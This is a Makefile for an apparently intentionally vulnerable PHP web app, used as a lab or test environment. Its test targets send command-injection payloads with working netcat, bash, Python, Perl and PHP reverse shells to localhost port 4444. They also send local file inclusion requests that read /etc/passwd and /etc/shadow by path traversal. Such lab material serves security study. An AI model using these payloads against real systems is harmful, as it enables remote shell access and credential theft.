.PHONY: run run-debug logs clear-logs clean kill bundle archive

run:
	@chmod +x "$$(command -v wasmer)" 2>/dev/null || true
	wasmer run . --net --command run

run-debug:
	@chmod +x "$$(command -v wasmer)" 2>/dev/null || true
	wasmer run . --net --command run-debug

# Test legitimate ping
test-ping:
	curl "http://localhost:9999/vulnerable.php?host=8.8.8.8"

# Test simple command injection
test-injection-simple:
	curl "http://localhost:9999/vulnerable.php?host=8.8.8.8;whoami"

# Test Netcat reverse shell attack
test-revshell-netcat:
	curl "http://localhost:9999/vulnerable.php?host=8.8.8.8;nc%20127.0.0.1%204444%20-e%20/bin/sh"

# Test Bash /dev/tcp reverse shell attack
test-revshell-bash:
	curl "http://localhost:9999/vulnerable.php?host=8.8.8.8;bash%20-i%20>%26%20/dev/tcp/127.0.0.1/4444%200>%261"

# Test Python reverse shell attack
test-revshell-python:
	curl -G "http://localhost:9999/vulnerable.php" --data-urlencode "host=8.8.8.8;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call([\"/bin/sh\",\"-i\"])'"

# Test Perl reverse shell attack
test-revshell-perl:
	curl "http://localhost:9999/vulnerable.php?host=8.8.8.8;perl%20-e%20'use%20Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));connect(S,sockaddr_in(4444,inet_aton(%22127.0.0.1%22)));open(STDIN,%22>%26S%22);open(STDOUT,%22>%26S%22);exec(%22/bin/sh%20-i%22);'"

# Test PHP reverse shell attack
test-revshell-php:
	curl "http://localhost:9999/vulnerable.php?host=8.8.8.8;php%20-r%20'\$$sock=fsockopen(%22127.0.0.1%22,4444);exec(%22/bin/sh%20-i%20<%263%20>%263%202>%263%22);'"

# Test all reverse shell payloads sequentially (requires nc -l 4444 running)
test-all-revshells:
	@echo "Testing all reverse shell payloads..."
	@echo "Make sure 'nc -l 4444' is running in another terminal!"
	@echo ""
	@echo "1. Testing Netcat payload..."
	@sleep 2
	@make test-revshell-netcat
	@echo ""
	@echo "2. Testing Bash payload..."
	@sleep 2
	@make test-revshell-bash
	@echo ""
	@echo "3. Testing Python payload..."
	@sleep 2
	@make test-revshell-python

# View attack logs
logs:
	@echo "=== Access Logs ==="
	@cat fake_logs/access.log 2>/dev/null || echo "No access logs yet"
	@echo ""
	@echo "=== Attack Logs (Command Injection) ==="
	@cat fake_logs/attacks.log 2>/dev/null || echo "No attack logs yet"
	@echo ""
	@echo "=== LFI Attack Logs ==="
	@cat fake_logs/lfi_attacks.log 2>/dev/null || echo "No LFI attack logs yet"

# LFI Tests
test-lfi-legitimate:
	curl "http://localhost:9999/lfi.php?page=info.php"

test-lfi-passwd:
	curl "http://localhost:9999/lfi.php?page=/etc/passwd"

test-lfi-shadow:
	curl "http://localhost:9999/lfi.php?page=/etc/shadow"

test-lfi-traversal-passwd:
	curl "http://localhost:9999/lfi.php?page=../../../etc/passwd"

test-lfi-traversal-shadow:
	curl "http://localhost:9999/lfi.php?page=../../../etc/shadow"

test-lfi-logs:
	curl "http://localhost:9999/lfi.php?page=/var/log/access.log"

test-all-lfi:
	@echo "Testing LFI attacks..."
	@echo ""
	@echo "1. Reading /etc/passwd..."
	@make test-lfi-passwd
	@echo ""
	@echo "2. Reading /etc/shadow..."
	@make test-lfi-shadow
	@echo ""
	@echo "3. Directory traversal to /etc/passwd..."
	@make test-lfi-traversal-passwd

# Clear logs
clear-logs:
	@rm -f fake_logs/*.log
	@echo "Logs cleared"

# Conventional clean target alias for log cleanup
clean: clear-logs

test-create:
	curl http://127.0.0.1:9999/create


kill:
	@echo "Killing server process..."
	@pkill -f "wasmer run . --net" || echo "No server process found"


archive:
	git archive -o wasm-vulnerable-app-$(shell git rev-parse --short HEAD).zip HEAD


tag-update:
	@echo "Updating version tag in README.md..."
	@VERSION="$$(cat ../VERSION)" && \
	echo "New version: $$VERSION" && \
	git tag -a "$$VERSION" -m "Release version $$VERSION" && \
	git push origin --tags